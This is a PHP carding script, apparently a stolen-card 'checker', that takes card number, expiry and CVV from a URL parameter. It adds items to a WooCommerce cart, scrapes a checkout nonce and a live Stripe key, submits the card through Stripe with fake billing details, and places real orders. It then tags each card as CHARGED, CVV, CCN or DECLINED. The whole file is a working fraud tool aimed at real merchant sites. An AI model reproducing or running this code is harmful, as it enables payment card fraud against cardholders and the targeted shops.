

<?php

require "z.php";


/*
curl_setopt_array($ch, [CURLOPT_COOKIEFILE => $cx, CURLOPT_COOKIEJAR => $cx]);
$headers[] = 'user-agent: '.$ua.'';
*/


function multiexplode($delimiters, $string)
{
    $one = str_replace($delimiters, $delimiters[0], $string);
    $two = explode($delimiters[0], $one);
    return $two;
}

$lista = $_GET['lista'];
$cc = multiexplode(array(":", "|", ""), $lista)[0];
$mes = multiexplode(array(":", "|", ""), $lista)[1];
$ano = multiexplode(array(":", "|", ""), $lista)[2];
$cvv1 = multiexplode(array(":", "|", ""), $lista)[3];


if (strlen($ano) == 4) {
    $ano = substr($ano, 2); // Return the last two digits
}


$startTime = microtime(true);


$endTime = microtime(true);
$overallTime = $endTime - $startTime;


//Cart
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://slicespark.com/product/5-kitchen-knives-set-cooking-knives/');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'Host: slicespark.com';
$headers[] = 'content-type: multipart/form-data; boundary=----WebKitFormBoundaryUf1ap35wAOxbi4as';
$headers[] = 'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7';
$headers[] = 'origin: https://slicespark.com';
$headers[] = 'user-agent: '.$ua.'';
curl_setopt_array($ch, [CURLOPT_COOKIEFILE => $cx, CURLOPT_COOKIEJAR => $cx]);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, '------WebKitFormBoundaryUf1ap35wAOxbi4as
Content-Disposition: form-data; name="quantity"

1
------WebKitFormBoundaryUf1ap35wAOxbi4as
Content-Disposition: form-data; name="add-to-cart"

147
------WebKitFormBoundaryUf1ap35wAOxbi4as--
');
$cart = curl_exec($ch);



//checkout
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://diynailpolish.com.au/checkout/');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'Host: diynailpolish.com.au';
$headers[] = 'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7';
$headers[] = 'user-agent: '.$ua.'';
curl_setopt_array($ch, [CURLOPT_COOKIEFILE => $cx, CURLOPT_COOKIEJAR => $cx]);
curl_setopt_array($ch, array(CURLOPT_HTTPHEADER => $headers, CURLOPT_FOLLOWLOCATION => 0, CURLOPT_RETURNTRANSFER => 1, CURLOPT_SSL_VERIFYPEER => 0, CURLOPT_SSL_VERIFYPEER => 0, CURLOPT_SSL_VERIFYHOST => 0));

$d = curl_exec($ch);
$n = trim(strip_tags(v($d, '<input type="hidden" id="woocommerce-process-checkout-nonce" name="woocommerce-process-checkout-nonce" value="','" />')));
$cn = v($d ,'{"key":"pk_live','"');
$pk = 'pk_live'.$cn;
/*echo 'Nonce: '.$n.'<br>';
echo 'cn: '.$key.'<br>';
*/

//checkout
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://diynailpolish.com.au/wp-admin/admin-ajax.php');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'Host: diynailpolish.com.au';
$headers[] = 'content-type: multipart/form-data; boundary=----WebKitFormBoundaryAGqxevOgTqT2C7hd';
$headers[] = 'referer: https://diynailpolish.com.au/checkout/';
$headers[] = 'accept: */*';
$headers[] = 'origin: https://diynailpolish.com.au';
$headers[] = 'user-agent: '.$ua.'';
curl_setopt_array($ch, [CURLOPT_COOKIEFILE => $cx, CURLOPT_COOKIEJAR => $cx]);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, '------WebKitFormBoundary1bktwIrNukoa5itN
Content-Disposition: form-data; name="attribute_bottle-size"

250ml
------WebKitFormBoundary1bktwIrNukoa5itN
Content-Disposition: form-data; name="attribute_quantity"

1
------WebKitFormBoundary1bktwIrNukoa5itN
Content-Disposition: form-data; name="quantity"

1
------WebKitFormBoundary1bktwIrNukoa5itN
Content-Disposition: form-data; name="add-to-cart"

391
------WebKitFormBoundary1bktwIrNukoa5itN
Content-Disposition: form-data; name="product_id"

391
------WebKitFormBoundary1bktwIrNukoa5itN
Content-Disposition: form-data; name="variation_id"

399
------WebKitFormBoundary1bktwIrNukoa5itN--');
$checkout = curl_exec($ch);


//Payment method

//$email = 'jhefvrix%2B'.$first_name.'%40gmail.com';
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'Host: api.stripe.com';
$headers[] = 'referer: https://js.stripe.com/';
$headers[] = 'origin: https://js.stripe.com';
$headers[] = 'user-agent: '.$ua.'';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'billing_details[name]=mark+sy&billing_details[email]=logansteve489%40gmail.com&billing_details[phone]=&billing_details[address][city]=Northern+Territory&billing_details[address][country]=AU&billing_details[address][line1]=Stevens+Creek+Blvd&billing_details[address][line2]=&billing_details[address][postal_code]=5445&billing_details[address][state]=ACT&type=card&card[number]='.$cc.'&card[cvc]='.$cvv1.'&card[exp_year]='.$ano.'&card[exp_month]='.$mes.'&allow_redisplay=unspecified&pasted_fields=number&payment_user_agent=stripe.js%2Fd182db0e09%3B+stripe-js-v3%2Fd182db0e09%3B+payment-element%3B+deferred-intent&referrer=https%3A%2F%2Fdiynailpolish.com.au&time_on_page=104498&client_attribution_metadata[client_session_id]=2cc88efb-254a-44c9-881c-342e3487a7e2&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=payment-element&client_attribution_metadata[merchant_integration_version]=2021&client_attribution_metadata[payment_intent_creation_flow]=deferred&client_attribution_metadata[payment_method_selection_flow]=merchant_specified&guid=73bfe534-7cb8-4957-916f-04c11a91c554a8bbd9&muid=55d92806-947a-4f59-8fcc-7a498f47be9c6c4796&sid=aa2e92db-4ce0-464d-8e08-11a5cdc6413bed780c&key=pk_live_iBIpeqzKOOx2Y8PFCRBfyMU000Q7xVG4Sn&_stripe_account=acct_1M1jSsFyuf3gCW33');
$curl = curl_exec($ch);

$data = json_decode($curl);
$pm = $data->id;

//Result

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://diynailpolish.com.au/?wc-ajax=checkout');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'Host: diynailpolish.com.au';
$headers[] = 'accept: application/json, text/javascript, */*; q=0.01';
$headers[] = 'content-type: application/x-www-form-urlencoded; charset=UTF-8';
$headers[] = 'x-requested-with: XMLHttpRequest';
$headers[] = 'referer: https://diynailpolish.com.au/checkout/';
$headers[] = 'user-agent: '.$ua.'';
$headers[] = 'origin: https://diynailpolish.com.au';
curl_setopt_array($ch, [CURLOPT_COOKIEFILE => $cx, CURLOPT_COOKIEJAR => $cx]);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'wc_order_attribution_source_type=typein&wc_order_attribution_referrer=(none)&wc_order_attribution_utm_campaign=(none)&wc_order_attribution_utm_source=(direct)&wc_order_attribution_utm_medium=(none)&wc_order_attribution_utm_content=(none)&wc_order_attribution_utm_id=(none)&wc_order_attribution_utm_term=(none)&wc_order_attribution_utm_source_platform=(none)&wc_order_attribution_utm_creative_format=(none)&wc_order_attribution_utm_marketing_tactic=(none)&wc_order_attribution_session_entry=https%3A%2F%2Fdiynailpolish.com.au%2Fmy-account%2F&wc_order_attribution_session_start_time=2024-08-04+07%3A56%3A08&wc_order_attribution_session_pages=10&wc_order_attribution_session_count=1&wc_order_attribution_user_agent=Mozilla%2F5.0+(Windows+NT+10.0%3B+Win64%3B+x64)+AppleWebKit%2F537.36+(KHTML%2C+like+Gecko)+Chrome%2F127.0.0.0+Safari%2F537.36+Edg%2F127.0.0.0&wc_order_attribution_source_type=typein&wc_order_attribution_referrer=(none)&wc_order_attribution_utm_campaign=(none)&wc_order_attribution_utm_source=(direct)&wc_order_attribution_utm_medium=(none)&wc_order_attribution_utm_content=(none)&wc_order_attribution_utm_id=(none)&wc_order_attribution_utm_term=(none)&wc_order_attribution_utm_source_platform=(none)&wc_order_attribution_utm_creative_format=(none)&wc_order_attribution_utm_marketing_tactic=(none)&wc_order_attribution_session_entry=https%3A%2F%2Fdiynailpolish.com.au%2Fmy-account%2F&wc_order_attribution_session_start_time=2024-08-04+07%3A56%3A08&wc_order_attribution_session_pages=10&wc_order_attribution_session_count=1&wc_order_attribution_user_agent=Mozilla%2F5.0+(Windows+NT+10.0%3B+Win64%3B+x64)+AppleWebKit%2F537.36+(KHTML%2C+like+Gecko)+Chrome%2F127.0.0.0+Safari%2F537.36+Edg%2F127.0.0.0&billing_first_name=mark&billing_last_name=sy&billing_company=&billing_country=AU&billing_address_1=Stevens+Creek+Blvd&billing_address_2=&billing_city=Northern+Territory&billing_state=ACT&billing_postcode=5445&billing_phone=&billing_email=logansteve489%40gmail.com&mailchimp_woocommerce_newsletter=1&shipping_first_name=&shipping_last_name=&shipping_company=&shipping_country=AU&shipping_address_1=&shipping_address_2=&shipping_city=&shipping_state=ACT&shipping_postcode=&shipping_phone=&order_comments=&shipping_method%5B0%5D=flat_rate%3A4&payment_method=woocommerce_payments&woocommerce-process-checkout-nonce='.$n.'&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review&wcpay-fingerprint=34f5e9e7edb225fbf9ef4accb2293bc6&wcpay-payment-method='.$pm.'');
$a = curl_exec($ch);
$a;
//echo 'Token); .$Token.'<br>'
echo $a.'<br>';
$ro2 = json_decode($a);
echo $e;
$result = $ro2->result;
$message = trim(strip_tags($ro2->messages));
/*
$url = $ro2['redirect'];
$od = $ro2['order_id'];
*/
$endTime = microtime(true);
$overallTime = $endTime - $startTime;

if(strpos($message, 'Gateway Rejected: avs') !== false){
    echo '<div style="margin-bottom: 8px;"><div style="background-color: green; padding: 3px; display: inline-block; color: white; border-radius: 3px;"> [#CVV] </div> <div style="background-color: #b8731a; padding: 3px; display: inline-block; color: white; border-radius: 3px;">'. $lista .'</div> <div style="background-color: #2b1675; padding: 3px; display: inline-block; color: white; border-radius: 3px;"> [ '.$ls.' ] </div> <div style="background-color: #424145; padding: 3px; display: inline-block; color: white; border-radius: 3px;"> [ T: '.number_format($overallTime, 2).'s ] </div> <div style="background-color: #3788fa; padding: 3px; display: inline-block; color: white; border-radius: 3px;"> [ IP: '.$ip.' ] </div><br></div>';
}
else if(strpos($message, 'The card verification number does not match') !== false){
    echo '<div style="margin-bottom: 8px;"><div style="background-color: green; padding: 3px; display: inline-block; color: white; border-radius: 3px;"> [#CCN] </div> <div style="background-color: #b8731a; padding: 3px; display: inline-block; color: white; border-radius: 3px;">'. $lista .'</div> <div style="background-color: #2b1675; padding: 3px; display: inline-block; color: white; border-radius: 3px;"> [ '.$message.' ] </div> <div style="background-color: #424145; padding: 3px; display: inline-block; color: white; border-radius: 3px;"> [ T: '.number_format($overallTime, 2).'s ] </div> <div style="background-color: #3788fa; padding: 3px; display: inline-block; color: white; border-radius: 3px;"> [ IP: '.$ip.' ] </div><br></div>';
}
else if ($result === 'success'){ 
    echo '<div style="margin-bottom: 8px;"><div style="background-color: green; padding: 3px; display: inline-block; color: white; border-radius: 3px;"> [#CHARGED] </div> <div style="background-color: #b8731a; padding: 3px; display: inline-block; color: white; border-radius: 3px;">'. $lista .'</div> <div style="background-color: #2b1675; padding: 3px; display: inline-block; color: white; border-radius: 3px;">[$4] [ Order Placed ID: '.$od.' ] </div> <div style="background-color: #424145; padding: 3px; display: inline-block; color: white; border-radius: 3px;"> [ STRIPE + WOO ] </div> <div style="background-color: #424145; padding: 3px; display: inline-block; color: white; border-radius: 3px;"> [ T: '.number_format($overallTime, 2).'s ] </div> <div style="background-color: #3788fa; padding: 3px; display: inline-block; color: white; border-radius: 3px;"> [ IP: '.$ip.' ] </div><br></div>';
}
else if(strpos($message, 'Insufficient funds in account') !== false){
    echo '<div style="margin-bottom: 8px;"><div style="background-color: green; padding: 3px; display: inline-block; color: white; border-radius: 3px;"> [#CVV] </div> <div style="background-color: #b8731a; padding: 3px; display: inline-block; color: white; border-radius: 3px;">'. $lista .'</div> <div style="background-color: #2b1675; padding: 3px; display: inline-block; color: white; border-radius: 3px;"> [ '.$message.' ] </div> <div style="background-color: #424145; padding: 3px; display: inline-block; color: white; border-radius: 3px;"> [T: '.number_format($overallTime, 2).'s] </div> <div style="background-color: #3788fa; padding: 3px; display: inline-block; color: white; border-radius: 3px;"> [ IP: '.$ip.' ] </div><br></div>';
}
else if($message === 'Call Issuer. Pick Up Card.'){
    echo '<div style="margin-bottom: 8px;"><div style="background-color: red; padding: 3px; display: inline-block; color: white; border-radius: 3px;"> [DECLINED] </div> <div style="background-color: #b8731a; padding: 3px; display: inline-block; color: white; border-radius: 3px;">'. $lista .'</div> <div style="background-color: #2b1675; padding: 3px; display: inline-block; color: white; border-radius: 3px;"> [ Call Issuer. Pick Up Card. ] </div> <div style="background-color: #424145; padding: 3px; display: inline-block; color: white; border-radius: 3px;"> [ T: '.number_format($overallTime, 2).'s ] </div> <div style="background-color: #3788fa; padding: 3px; display: inline-block; color: white; border-radius: 3px;"> [ IP: '.$ip.' ] </div><br></div>';
}
else if($message === 'Payment instrument type is not accepted by this merchant account.'){
    echo '<div style="margin-bottom: 8px;"><div style="background-color: red; padding: 3px; display: inline-block; color: white; border-radius: 3px;"> [DECLINED] </div> <div style="background-color: #b8731a; padding: 3px; display: inline-block; color: white; border-radius: 3px;">'. $lista .'</div> <div style="background-color: #2b1675; padding: 3px; display: inline-block; color: white; border-radius: 3px;"> [ Payment instrument type is not accepted by this merchant account. ] </div> <div style="background-color: #424145; padding: 3px; display: inline-block; color: white; border-radius: 3px;"> [ T: '.number_format($overallTime, 2).'s ] </div> <div style="background-color: #3788fa; padding: 3px; display: inline-block; color: white; border-radius: 3px;"> [ IP: '.$ip.' ] </div><br></div>';
}
else{
    echo '<div style="margin-bottom: 8px;"><div style="background-color: red; padding: 3px; display: inline-block; color: white; border-radius: 3px;"> [DECLINED] </div> <div style="background-color: #b8731a; padding: 3px; display: inline-block; color: white; border-radius: 3px;">'. $lista .'</div> <div style="background-color: #2b1675; padding: 3px; display: inline-block; color: white; border-radius: 3px;"> [ '.$message.' ] </div> <div style="background-color: #424145; padding: 3px; display: inline-block; color: white; border-radius: 3px;"> [ T: '.number_format($overallTime, 2).'s ] </div> <div style="background-color: #3788fa; padding: 3px; display: inline-block; color: white; border-radius: 3px;"> [ IP: '.$ip.' ] </div><br></div>';
}
curl_close($ch);
ob_flush();
unlink($cx);



?>